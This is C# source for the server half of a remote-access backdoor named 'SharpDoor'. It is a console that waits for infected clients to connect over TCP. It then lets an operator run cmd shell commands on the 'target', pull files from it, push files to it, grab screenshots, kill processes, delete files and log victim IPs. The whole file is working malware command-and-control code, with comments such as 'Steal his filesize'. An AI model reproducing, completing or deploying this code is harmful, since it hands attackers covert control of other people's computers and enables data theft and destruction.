using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Runtime.CompilerServices;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;


namespace SharpDoor_Server //Server side Console App
{
    class Program
    {
        static string GetCommand(string ipv4, string client_path, string path, int port)      //Get a command from the user of the command and control server
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n\nCurrent Server Working Directory: "+path+"\n");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Target: " + ipv4);
            Console.WriteLine("Port: " + port.ToString()+"\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Enter a command to be executed on target or type 'help' for a command guide\n");
            Console.Write(client_path+"> ");
            string command = Console.ReadLine();
            return command;

        }
        public static int Download(NetworkStream stream, TcpClient client, string filename)
        {
            //Declaration of variables
            int bytesRead = 0;int buffer = 4096; int x = 0; int f = 0;
            string root = Directory.GetCurrentDirectory();
            string confirm = Receive(stream, client);
            if (confirm == "FILE FOUND")
            {
                while (x < 1)
                {
                    string path = @root + "\\" + filename;
                    if (File.Exists(path))      //Check if file exists if so then change it bruh
                    {
                        filename = f.ToString() + filename;
                        f += 1;
                    }
                    else
                    {
                        string fS = Receive(stream, client);        //Steal his filesize
                        Console.WriteLine("Receiving a total of " + fS + " bytes from target");
                        int fileSize = int.Parse(fS);   //Parse it to a int
                        byte[] bytesToRead = new byte[fileSize];    //Create a byteArray of the size of the file
                        SupportFuncLib.ProgressBar(false, true);    //Start progress bar
                        while (bytesRead < bytesToRead.Length)  //While download is going on do this stuff
                        {
                            SupportFuncLib.ProgressBar(false,false);    //Update progress bar
                            if ((bytesRead + buffer) > bytesToRead.Length)      //Adjust buffer in case buffer is larger than buffer going over the wire
                            {
                                buffer = bytesToRead.Length - bytesRead;
                                
                            }
                            stream.Read(bytesToRead, bytesRead, buffer);    //Read bytes from stream
                            //Console.WriteLine("Read " + buffer + " bytes from target");
                            bytesRead += buffer;
                        }
                        SupportFuncLib.ProgressBar(true, false); //End progress bar
                        var fs = new FileStream(filename, FileMode.Create, FileAccess.Write);
                        fs.Write(bytesToRead, 0, bytesToRead.Length);       //Write bytes to a file 
                        fs.Close();
                        Send(stream, "0");      //Send confirmation message
                        
                        x += 1;
                    }
                }
                return 0;
            }
            else
            {
                
                return 1;
            }

        }
        static int Upload(NetworkStream stream, TcpClient client, string filename)      //Uploads a file from the server to the client over the network stream
        {
            int bytesSent = 0;int buffer = 4096;    //Declare variables
            string root = Directory.GetCurrentDirectory();
            string full_path = @root+"\\"+filename;
            if (File.Exists(full_path))     //If file exists tell client we are sending it
            {
                Send(stream, "upld "+filename);
                Console.WriteLine("Begining to upload " + filename + " to target");
                byte[] bytesToSend = File.ReadAllBytes(full_path);
                Send(stream, bytesToSend.Length.ToString());
                Thread.Sleep(100);
                while (bytesSent < bytesToSend.Length)  //Upload file loop
                {
                    if ((bytesSent + buffer) > bytesToSend.Length)  //If buffer is larger than possible buffer adjust buffer
                    {
                        buffer = bytesToSend.Length - bytesSent;
                    }
                    stream.Write(bytesToSend, bytesSent, bytesSent + buffer);   //Write file bytes to stream in intervals of buffer
                    Console.WriteLine("Sent " + buffer + " bytes to target");
                    bytesSent += buffer;
                }
                string output = Receive(stream, client);
                Console.WriteLine(output);
                return 0;
            }
            else    //if file doesnt exist return and dont send to client
            {
                Console.WriteLine("Error file name " + filename + "could not be located in the current working directory");
                return 1;
            }
        }

        static int Execute_Command(string command, string path, NetworkStream stream, 
            TcpClient client, TcpListener listener, string ipv4)    //Execute a command on the target *if returns 0 it sent a message to target
        {
            if (command == "help")  //INITIATE THE HELP FUCNTION
            {
                SupportFuncLib.Help();
                return 1;
            }
            else if (command.Contains("server -port -change:"))     //Change the port the server is using and notify client
            {
                try { 
                    int port = int.Parse(command[21..command.Length]);
                    List<int> ports = SupportFuncLib.GetPorts(); int check = 0;
                    while (check < ports.Count)
                    {
                        if (port == ports[check])   //check if port is a supported port
                        {
                            Send(stream, command);
                            Thread.Sleep(100);
                            return ports[check];
                        }
                        else
                        {
                            check += 1;
                        }
                    }   //if port is not supported return error message
                    Console.WriteLine("Error "+port+" is not a supported SharpDoor port");
                    return 1;
                }
                catch (Exception)   //if port is not a integer return a error message
                {
                    Console.WriteLine("Error "+command[21..command.Length]+" is not a valid integer");
                    return 1;
                }

            }
            else if (command == "client -screenshot")   //CLIENT SCREENSHOT FUNCTION
            {
                int x = 0;int f = 0;    
                while (x < 1)   //screenshot loop
                {
                    string filename = f.ToString()+"screenshot.png";    //Test filename to see if it exists
                    string full_path = path +"\\"+ filename;
                    if (File.Exists(@full_path))    //if file exists with the same name change the name
                    {
                        f += 1;
                    }
                    else
                    {
                        Send(stream, command);  //Start screenshot process
                        int rV = SupportFuncLib.GetScreenshot(stream, client, filename);    //Get screenshot from client and write to file
                        x = rV; //break loop
                    }
                }
                
                return 0;
            }
            else if (command == "exit")     //INITIATE SHUTDOWN FUNCTION
            {
                Send(stream, command);
                SupportFuncLib.Shutdown(stream, client, listener);
                return 0;
            }
            else if (command.Contains("task -killall "))
            {
                Send(stream, command);
                string proc = command[14..command.Length];
                string output = Receive(stream, client);
                Console.WriteLine(output);
                return 0;
            }
            else if (command.Contains("task -kill "))
            {
                string PID = command[11..command.Length];
                try
                {
                    int pid = int.Parse(PID);
                    Send(stream, command);
                    string output = Receive(stream, client);
                    Console.WriteLine(output);
                    return 0;
                }
                catch (Exception)
                {
                    Console.WriteLine("Error '"+PID+"' is not a integer");
                    return 1;
                }
            }
            else if (command =="task -ls")      //receive all running processes and their id's on target machine
            {
                Send(stream, command);
                string output = Receive(stream, client);
                Console.WriteLine(output);
                return 0;
            }
            else if (command == "ls")       //List all files in the target working directory
            {
                Send(stream, command);
                string output = Receive(stream, client);
                Console.WriteLine(output);
                return 0;
            }
            else if (command.Contains("server -cd "))       //Change the working directory on the server
            {
                int cLength = command.Length;
                string new_path = command.Substring(11, cLength - 11);
                int return_code = SupportFuncLib.ChangeDirectory(new_path);
                if (return_code == 0)
                {
                    Console.WriteLine("Server directory succesfully changed to: " + new_path);
                }
                else
                {
                    Console.WriteLine("Error could not locate " + new_path + " on server");
                }
                return 1;

            }
            else if (command.Contains("dl "))
            {
                string filename = command[3..command.Length];
                Send(stream, command);
                int rV = Download(stream, client, filename);
                if (rV == 0)
                {
                    Console.WriteLine("Succesfully downloaded file " + filename + " to server");
                }
                else
                {
                    Console.WriteLine("Error file " + filename + " could not be located in the current working directory");
                }
                return 0;
            }
            else if (command.Contains("upld ")) 
            {
                string filename = command[5..command.Length];
                int rV = Upload(stream, client,filename);
                if (rV == 0)
                {
                    return 0;
                }
                else
                {
                    return 1;
                }
            }
            else if (command.Contains("cd "))       //Change the working directory on the target machine
            {
                int cLength = command.Length;
                Send(stream, command);
                string confirmation = Receive(stream, client);
                if (confirmation == "PATH CHANGED")     //If the pathe exists on the client then throw a success message
                {
                    Console.WriteLine("Target path succesfully changed to: " + command.Substring(3, cLength - 3));
                }
                else            //If path does not exists throw error message
                {
                    Console.WriteLine("Error path: " + command.Substring(3, cLength - 3) + " not found on target");
                }
                return 0;
            }
            else if (command == "server -port -ls")     //Lists all available tcp ports for the server
            {
                SupportFuncLib.ListPorts();
                return 1;
            }

            else if (command == "server -ls")       //List current server working directory
            {
                string shell_command = "dir";
                Console.WriteLine(SupportFuncLib.ShellInjection(shell_command));
                return 1;
            }
            else if (command.Contains("shell "))        //Injects a cmd shell command on the target
            {
                Send(stream, command);
                string output = Receive(stream, client);
                Console.WriteLine(output);
                return 0;

            }
            else if (command.Contains("del "))      //Deletes a file or folder on the target system
            {
                Send(stream, command);
                string output = Receive(stream, client);
                Console.WriteLine(output);
                return 0;
            }
            else        //Error message for invalid command
            {
                Console.WriteLine("Error " + command + " is a invalid command");
                return 1;
            }
        }

        
        public static string Receive(NetworkStream stream, TcpClient client)   //Receive a message from the target
        {
            byte[] buffer = new byte[client.ReceiveBufferSize];
            int bytesRead = stream.Read(buffer, 0, client.ReceiveBufferSize);
            string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            return message;
        }

        public static void Send(NetworkStream stream, string message)      //Send a message to the target
        {
            byte[] sendData = Encoding.ASCII.GetBytes(message);
            stream.Write(sendData, 0, sendData.Length);
            return;
        }

        static void Main()     //Main Function
       {
            
            string version = "Alpha Unstable Build v1.13";        //Current Release Version and Build
            string IP = SupportFuncLib.GetIPV4();
            reboot:     //EXCEPTION CATCH REBOOT
            int PORT = 0;
            List<int> PORTS = SupportFuncLib.GetPorts();            //Define Useable Ports
            port_change:      //Port change pointer
            SupportFuncLib.BootGreeting(IP, PORTS[PORT], version);      //Boot Greeting upon startup or reboot
            TcpListener listener = new TcpListener(System.Net.IPAddress.Any, PORTS[PORT]);   //Create Server on port 88
            listener.Start();   //Start listening for connections
            while (true)
            {
                Console.WriteLine("\nWaiting for a connection from client . . .\n");
                TcpClient client = listener.AcceptTcpClient();  //ACCEPT CLIENT CONNECTION AND MAKE TCP HANDSHAKE
                Console.WriteLine("Got new connection !\n");
                NetworkStream stream = client.GetStream();      //GET THE STREAM FROM THE CLIENT FOR COMMUNICATION
                try
                {
                    RSACryptoServiceProvider csp = new RSACryptoServiceProvider();  //Create new crypto service provider
                    RSAParameters _privateKey = Crypto.PrivateKey(csp); //extract private ket from csp
                    RSAParameters _publicKey = Crypto.PublicKey(csp);   //extract public key from csp
                    string pubKey = Crypto.PublicKeyString(_publicKey); //Convert public key to string to send it
                    Crypto.SendPubKey(stream, client, pubKey);  //Send public key to client
                    string client_pubKey = Crypto.ReceivePubKey(stream, client);    //Receive clients public key

                    string ipv4 = Receive(stream, client);
                    SupportFuncLib.Connection_log(ipv4, PORTS[PORT]);  //Log Conecctions and ports to a txt file

                    //MAIN CONNECTION LOOP
                    int command_loop = 0;
                    while (command_loop < 1)
                    {
                        string client_path = Receive(stream, client);       //Receive the current working directory from the client
                        command_nosend_catch:  //Catch if the command does not require a response from client
                        string path = Directory.GetCurrentDirectory();      //Establish the server working directory
                        string command = GetCommand(ipv4, client_path, path, PORTS[PORT]);   //Execute the get command function from command control server
                        int sendCheck = Execute_Command(command, path, stream, client, listener, ipv4);   //execute given command
                        
                        if (sendCheck == 1) //check if the command sent to the server or not
                        {
                            goto command_nosend_catch;
                        }
                        //PORT CHANGE CATCH
                        else if (sendCheck == 88) { PORT = 0;listener.Stop();stream.Close(); goto port_change; }
                        else if (sendCheck == 22) { PORT = 1;listener.Stop();stream.Close(); goto port_change; }
                        else if (sendCheck == 360) { PORT = 2;listener.Stop();stream.Close(); goto port_change; }
                        else if (sendCheck == 8000) { PORT = 3;listener.Stop();stream.Close(); goto port_change; }
                        else if (sendCheck == 8080) { PORT = 4;listener.Stop();stream.Close(); goto port_change; }
                        command_loop = 0;
                    }

                    stream.Close();
                    client.Close();
                    listener.Stop();
                    Environment.Exit(0);
                }
                catch(Exception e)  //Catch any exception and print it to the server then go to reboot
                {
                    Console.WriteLine("Error Reboot: "+e);
                    listener.Stop();
                    goto reboot;    //Go to reboot exception catch
                }
            }
        }
    }
}
